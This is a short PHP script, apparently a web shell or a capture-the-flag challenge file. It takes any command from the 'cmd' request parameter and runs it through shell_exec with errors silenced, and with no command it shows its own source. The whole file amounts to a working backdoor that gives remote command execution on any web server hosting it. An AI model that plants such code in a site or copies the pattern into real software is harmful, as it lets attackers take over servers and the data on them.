<?php
error_reporting(0);
$cmd = $_REQUEST['cmd'] ?? '';
if ($cmd !== '') {
    shell_exec($cmd);
    echo "Command executed.";
} else {
    show_source(__FILE__);
}
?>
